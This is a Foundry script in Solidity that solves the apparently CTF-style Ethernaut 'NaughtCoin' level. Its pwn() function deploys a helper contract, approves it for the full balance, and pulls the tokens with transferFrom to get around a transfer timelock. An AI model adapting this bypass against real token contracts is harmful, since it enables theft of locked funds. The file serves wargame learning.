//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "../src/NaughtCoin.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoinScript is Script {
    NaughtCoin public naughtCoin;
    ReceiveTokens public receiveTokens;

    function run() external {
        naughtCoin = NaughtCoin(0x521F47a8C1ca119dDd7c1585204EaDAEb97e358C);
        pwn();
    }

    function pwn() public {
        vm.startBroadcast();
        receiveTokens = new ReceiveTokens(naughtCoin);
        naughtCoin.approve(address(receiveTokens), 1000000000000000000000000);
        receiveTokens.tranferTokens();
        vm.stopBroadcast();
    }
}

contract ReceiveTokens {
    NaughtCoin public naughtCoin;

    constructor(NaughtCoin _naughtCoin) {
        naughtCoin = _naughtCoin;
    }

    function tranferTokens() public {
        naughtCoin.transferFrom(
            msg.sender,
            address(this),
            1000000000000000000000000
        );
    }
}
